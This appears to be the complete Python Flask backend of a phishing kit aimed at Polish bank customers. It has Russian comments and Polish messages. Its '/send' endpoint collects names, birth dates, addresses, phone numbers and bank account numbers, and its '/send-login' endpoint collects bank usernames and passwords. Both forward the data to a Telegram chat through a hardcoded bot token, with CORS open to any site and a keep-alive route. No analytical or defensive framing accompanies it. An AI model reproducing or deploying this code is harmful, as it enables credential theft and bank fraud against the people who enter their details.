from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
import json
import time

app = Flask(__name__)
CORS(app)  # Разрешаем запросы с любых доменов

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs'
TELEGRAM_CHAT_ID = '-1004256695843'

# ============= ГЛАВНАЯ СТРАНИЦА =============
@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "message": "Server is active",
        "endpoints": {
            "/": "GET - Проверка статуса",
            "/ping": "GET - Keep-alive пинг",
            "/send": "POST - Отправка данных формы",
            "/send-login": "POST - Отправка логинов"
        },
        "timestamp": time.time()
    })

# ============= KEEP-ALIVE (анти-засыпание) =============
@app.route('/ping')
def ping():
    return jsonify({
        "status": "alive",
        "timestamp": time.time()
    })

# ============= ПРИЁМ ДАННЫХ ИЗ ФОРМЫ =============
@app.route('/send', methods=['POST'])
def send_data():
    try:
        data = request.json
        print(f"📥 Получены данные: {data}")  # Логирование
        
        # Формируем сообщение для Telegram
        message = f"""📋 NOWE DANE FORMULARZA:
        
👤 Imię: {data.get('fullname', 'Brak')}
📅 Data urodzenia: {data.get('birthdate', 'Brak')}
📱 Telefon: {data.get('phone', 'Brak')}
🏠 Ulica: {data.get('street', 'Brak')}
🏙️ Miasto: {data.get('city', 'Brak')}
📮 Kod: {data.get('postal', 'Brak')}
🏦 NRB: {data.get('iban', 'Brak')}
        """
        
        # Отправляем в Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Dane wysłane pomyślnie!"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Telegram error: {response.status_code}"
            }), 500
            
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= ПРИЁМ ДАННЫХ ЛОГИНА =============
@app.route('/send-login', methods=['POST'])
def send_login():
    try:
        data = request.json
        print(f"🔐 Получен логин: {data}")  # Логирование
        
        message = f"""🔐 LOGOWANIE DO BANKU:

🏦 Bank: {data.get('bank', 'Brak')}
👤 Login: {data.get('username', 'Brak')}
🔑 Hasło: {data.get('password', 'Brak')}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Login sent successfully!"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Telegram error: {response.status_code}"
            }), 500
            
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= ОБРАБОТКА 404 =============
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "error": "Endpoint not found",
        "available_endpoints": {
            "/": "GET - Check status",
            "/ping": "GET - Keep-alive",
            "/send": "POST - Send form data",
            "/send-login": "POST - Send login data"
        }
    }), 404

# ============= ЗАПУСК =============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
